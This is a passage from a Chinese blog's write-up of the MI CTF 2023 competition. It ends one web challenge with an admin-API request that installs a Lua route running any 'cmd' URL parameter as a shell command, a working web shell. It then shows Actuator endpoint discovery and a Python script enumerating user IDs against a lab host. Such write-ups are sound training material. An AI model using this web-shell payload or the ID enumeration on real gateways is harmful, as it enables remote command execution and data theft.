</span><span style="display:block;padding:0 1.25rem">X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
</span><span style="display:block;padding:0 1.25rem">Connection: close
</span><span style="display:block;padding:0 1.25rem">Content-Length: 415
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">{
</span><span style="display:block;padding:0 1.25rem">    &quot;uri&quot;: &quot;/hello/sumy.html&quot;,
</span><span style="display:block;padding:0 1.25rem">&quot;script&quot;: &quot;local _M = {} \n function _M.access(conf, ctx) \n local os = require(&#x27;os&#x27;)\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, &#x27;r&#x27;))\n local s = assert(f:read(&#x27;*a&#x27;))\n ngx.say(s)\n f:close()  \n end \nreturn _M&quot;,
</span><span style="display:block;padding:0 1.25rem">    &quot;upstream&quot;: {
</span><span style="display:block;padding:0 1.25rem">        &quot;type&quot;: &quot;roundrobin&quot;,
</span><span style="display:block;padding:0 1.25rem">        &quot;nodes&quot;: {
</span><span style="display:block;padding:0 1.25rem">            &quot;example.com:80&quot;: 1
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">然后访问执行命令，获取目录内容，进而得到flag</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>http://10.167.32.15:9080/hello/sumy.html?cmd=ls</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<h3 id="web-32-actuator-404" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-32-actuator-404">#</a>web-32 Actuator 404</h3>
<p class="my-4 leading-7">这个题知道是找actuator的端点，直接访问是返回404。猜测缺少一个路径前缀。扫了所有3位字符的组合路径/aaa/actuator/env没发现有内容。。。</p>
<p class="my-4 leading-7">==================卡了很久的分割线=================</p>
<p class="my-4 leading-7">放出了hint：/xiaomi/management/</p>
<p class="my-4 leading-7">拼接路径/xiaomi/management/actuator/env找到了端点。然后就是各种翻找，在/xiaomi/management/actuator/httptrace发现了一个奇怪的地址。/xiaomi/ctf/api/v1/userInfo?id=1</p>
<p class="my-4 leading-7">遍历id，在第999个ID发现了flag。</p>
<div class="language-python"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-python" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>import requests
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">def requestUserInfo(id):
</span><span style="display:block;padding:0 1.25rem">    url = &quot;http://10.167.96.4:8080/xiaomi/ctf/api/v1/userInfo?id={}&quot;.format(id)
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">    payload = {}
</span><span style="display:block;padding:0 1.25rem">    headers = {
</span><span style="display:block;padding:0 1.25rem">        &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;,
</span><span style="display:block;padding:0 1.25rem">        &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;,
</span><span style="display:block;padding:0 1.25rem">        &#x27;Cache-Control&#x27;: &#x27;no-cache&#x27;,
</span><span style="display:block;padding:0 1.25rem">        &#x27;Connection&#x27;: &#x27;keep-alive&#x27;,
</span><span style="display:block;padding:0 1.25rem">        &#x27;Pragma&#x27;: &#x27;no-cache&#x27;,
</span><span style="display:block;padding:0 1.25rem">        &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,
</span><span style="display:block;padding:0 1.25rem">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36&#x27;
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">    response = requests.request(&quot;GET&quot;, url, headers=headers, data=payload)
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">    print(id)
</span><span style="display:block;padding:0 1.25rem">    print(response.json())
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">for i in range(600, 1000):
</span><span style="display:block;padding:0 1.25rem">    requestUserInfo(i)</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7"><img alt="result" src="/static/image/web-32-1.0dbc6a8d.png"/></p><!--/$--></div><div class="rspress-doc-footer"><div class="postFooter_2e2af flex flex-col"><div class="flex flex-col sm:flex-row sm:justify-around gap-4 pt-6"><div class="prev_edac1 flex flex-col"><a class="link_03735 pagerLink_edac1 cursor-pointer" target="" href="/2023/04/29/replay-attack-and-rust-and-webassembly/index.html"><span class="desc_edac1">上一篇</span><span class="title_edac1">重放攻击与Rust与WebAssembly</span></a></div><div class="next_edac1 flex flex-col"><a class="link_03735 pagerLink_edac1 next_edac1 cursor-pointer" target="" href="/2023/06/02/ctf-mobile-startup/index.html"><span class="desc_edac1">下一篇</span><span class="title_edac1">CTF Mobile 基础入门</span></a></div></div></div><footer class="mt-8"><div class="xs:flex pb-5 px-2 justify-end items-center"><div class="flex text-sm text-text-2 leading-6 sm:leading-8 font-medium"><p>最后编辑时间<!-- -->: <span>2024/2/12 18:55:54</span></p></div></div><div class="flex flex-col"><a href="https://github.com/sumy7/SumyBlog-rspress/blob/main/source/../source/_posts/2023-05-06-mi-ctf-2023-writeup/2023-05-06-mi-ctf-2023-writeup.md" target="_blank" class="editLink_2a169">📝 在 GitHub 上编辑此页</a></div><div class="flex flex-col sm:flex-row sm:justify-around gap-4 pt-6"><div class="prev_e7091 flex flex-col"></div><div class="next_e7091 flex flex-col"></div></div></footer></div></div></div><div class="aside-container_edeb4"><div><div></div><div class="flex flex-col"><div class="&lt;lg:hidden"><div id="aside-container" class="relative text-sm font-medium"><div class="leading-7 block text-sm font-semibold pl-3">目录</div><nav class="mt-1"><ul class="relative"><li><a href="#iot" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:0;font-weight:semibold"><span class="aside-link-text block">IoT</span></a></li><li><a href="#iot-1-cyber-pulse" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">IoT-1 Cyber Pulse</span></a></li><li><a href="#iot-2-debug" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">IoT-2 Debug</span></a></li><li><a href="#iot-3-pcb" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">IoT-3 PCB</span></a></li><li><a href="#iot-4-ble1" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">IoT-4 BLE1</span></a></li><li><a href="#iot-5-ble3" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">IoT-5 BLE3</span></a></li><li><a href="#iot-8-ble2" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">IoT-8 BLE2</span></a></li><li><a href="#iot-9-你的wi-fi流量被监听了么" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">IoT-9 你的Wi-Fi流量被监听了么？</span></a></li><li><a href="#iot-10-7-segment" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">IoT-10 7 segment</span></a></li><li><a href="#misc" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:0;font-weight:semibold"><span class="aside-link-text block">Misc</span></a></li><li><a href="#misc-1-红线红线红线" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">misc-1 红线！红线！红线！</span></a></li><li><a href="#misc-2-有趣的前端" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">misc-2 有趣的前端</span></a></li><li><a href="#misc-3-敏感数据" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">misc-3 敏感数据</span></a></li><li><a href="#misc-4-ez-forensics" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">misc-4 ez forensics</span></a></li><li><a href="#misc-5-chatgpt" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">misc-5 ChatGPT</span></a></li><li><a href="#misc-6-弦外之音" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">misc-6 弦外之音</span></a></li><li><a href="#mobile" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:0;font-weight:semibold"><span class="aside-link-text block">Mobile</span></a></li><li><a href="#mobile-1-ba5e64" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">mobile-1 ba5e64</span></a></li><li><a href="#mobile-2-xor" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">mobile-2 xor</span></a></li><li><a href="#mobile-3-maze" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">mobile-3 MAZE</span></a></li><li><a href="#mobile-4-重定向初探" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">mobile-4 重定向初探</span></a></li><li><a href="#mobile-5-数学家" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">mobile-5 数学家</span></a></li><li><a href="#mobile-6-多少个md5" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">mobile-6 多少个MD5</span></a></li><li><a href="#mobile-7-pdd" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">mobile-7 pdd</span></a></li><li><a href="#mobile-9-bqq" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">mobile-9 bqq</span></a></li><li><a href="#mobile-10-vm" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">mobile-10 VM</span></a></li><li><a href="#mobile-11-重定向进阶" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">mobile-11 重定向进阶</span></a></li><li><a href="#web" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:0;font-weight:semibold"><span class="aside-link-text block">Web</span></a></li><li><a href="#web-1-聊天室" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-1 聊天室</span></a></li><li><a href="#web-2-风险组件" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-2 风险组件</span></a></li><li><a href="#web-3-简单文件包含" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-3 简单文件包含</span></a></li><li><a href="#web-4-不安全的redis服务" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-4 不安全的Redis服务</span></a></li><li><a href="#web-5-真假难辨" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-5 真假难辨</span></a></li><li><a href="#web-6-低版本的flask" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-6 低版本的Flask</span></a></li><li><a href="#web-7-粗心上线" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-7 粗心上线</span></a></li><li><a href="#web-8-elasticsearch" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-8 ElasticSearch</span></a></li><li><a href="#web-9-才开始学nginx" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-9 才开始学nginx</span></a></li><li><a href="#web-10-标准模板欢迎光临" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-10 标准模板：欢迎光临</span></a></li><li><a href="#web-11-unserialize" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-11 unserialize</span></a></li><li><a href="#web-12-不安全的代理服务" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-12 不安全的代理服务</span></a></li><li><a href="#web-13-php-audit" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-13 php-audit</span></a></li><li><a href="#web-14-jenkins" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-14 jenkins</span></a></li><li><a href="#web-15-一个blog" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-15 一个blog</span></a></li><li><a href="#web-16-认证绕过" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-16 认证绕过</span></a></li><li><a href="#web-17-文件解析器" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-17 文件解析器</span></a></li><li><a href="#web-18-self-gpt---1" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-18 SELF GPT - 1</span></a></li><li><a href="#web-19-粗心的程序员" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-19 粗心的程序员！</span></a></li><li><a href="#web-21-一个网络测试工具" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-21 一个网络测试工具</span></a></li><li><a href="#web-22-文件预览服务器" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-22 文件预览服务器</span></a></li><li><a href="#web-23-php-is-best" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-23 PHP IS BEST</span></a></li><li><a href="#web-24-简约但不简单" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-24 简约但不简单</span></a></li><li><a href="#web-25-神奇的计算器" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-25 神奇的计算器</span></a></li><li><a href="#web-26-天女散花" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-26 天女散花</span></a></li><li><a href="#web-27-想获取flag吗" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-27 想获取flag吗</span></a></li><li><a href="#web-28-神奇的魔方" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-28 神奇的魔方</span></a></li><li><a href="#web-29-拿到管理员权限就能得到flag啦" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-29 拿到管理员权限就能得到flag啦！</span></a></li><li><a href="#web-30-魔法再现" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-30 魔法再现</span></a></li><li><a href="#web-31-密钥密钥不能默认" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-31 密钥，密钥，不能默认</span></a></li><li><a href="#web-32-actuator-404" class="aside-link transition-all duration-300 hover:text-text-1 text-text-2 block" style="padding-left:12px;font-weight:semibold"><span class="aside-link-text block">web-32 Actuator 404</span></a></li></ul></nav></div></div></div></div></div></div></div></section><footer class="mt-6 py-8 px-6 sm:p-8 w-full border-t border-solid border-divider-light"><div class="m-auto w-full text-center"><div class="font-meduim text-sm text-text-2">© 2015-<!-- -->2024<!-- --> SumyBlog. Powered by<!-- --> <a href="https://rspress.dev/" target="_blank" rel="noreferrer">Rspress</a>.</div></div></footer></div></div></div><div id="search-container"></div></body></html>